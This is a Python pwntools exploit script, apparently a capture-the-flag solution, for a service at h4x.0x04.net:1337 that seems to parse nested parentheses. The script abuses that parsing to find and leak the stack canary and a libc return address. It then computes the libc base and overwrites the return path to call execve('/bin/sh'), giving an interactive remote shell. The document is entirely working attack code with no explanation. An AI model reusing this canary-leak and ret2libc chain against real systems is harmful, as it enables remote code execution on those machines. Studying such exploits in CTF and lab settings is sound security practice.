#!/usr/bin/env python
from pwn import *
from ctypes import c_uint32

host = 'h4x.0x04.net'
port = 1337

def to_uint32(message):
    return c_uint32(int(message.strip())).value

def get_canary_offset(p):
    message = '1'
    canary_offset = 1

    while True:
        message = '(' + '('*canary_offset + ')'*canary_offset
        p.sendline(message)
        p.recvline()

        if p.can_recv():
            break;
        else:
            canary_offset += 1
    canary_offset -= 1

    return canary_offset

def get_stack(p, canary_offset):
    stack = [0 for _ in range(9)]

    for i in range(9):
        message = '(' * (canary_offset + i + 1)
        message += ')' * 3

        j = i - 1
        while j >= 0:
            message += '+' + str(stack[j]) + ')'
            j -= 1

        message += ')' * (canary_offset - 3)

        p.sendline(message)
        stack[i] = c_uint32(to_uint32(p.recvline()) - sum(stack)).value

    return stack

def restore_stack(canary_offset, stack):
    message = '(' * (canary_offset + len(stack) - 1)
    message += str(stack[(len(stack) - 1)])
    message += ')' * 3

    i = len(stack) - 2
    while i >= 0:
        message += '+' + str(stack[i]) + ')'
        i -= 1

    message += ')' * (canary_offset - 3)

    return message


p = connect(host, port)

canary_offset = get_canary_offset(p)
p.close()

print('[!] Canary offset found: ' + str(canary_offset))

p = connect(host, port)

stack = get_stack(p, canary_offset)
canary = stack[0]

print('[!] Canary found: ' + str(hex(canary)))

libc_start_main = stack[8]

libc_elf = ELF('./libc-2.19.so')

lsm_libc = libc_elf.symbols['__libc_start_main']
libc_base = (libc_start_main - lsm_libc) & 0xfffff000

print('[!] libc base address found: ' + str(hex(libc_base)))

execve = libc_base + libc_elf.symbols['execve']
print('[!] execve address found: ' + str(hex(execve)))

binsh = libc_base + list(libc_elf.search('/bin/sh'))[0]
print('[!] /bin/sh address found: ' + str(hex(binsh)))

stack[8] = 0
stack[7] = 0
stack[6] = binsh
stack[5] = 0
stack[4] = execve

message = restore_stack(canary_offset, stack)

p.sendline(message)
p.interactive()
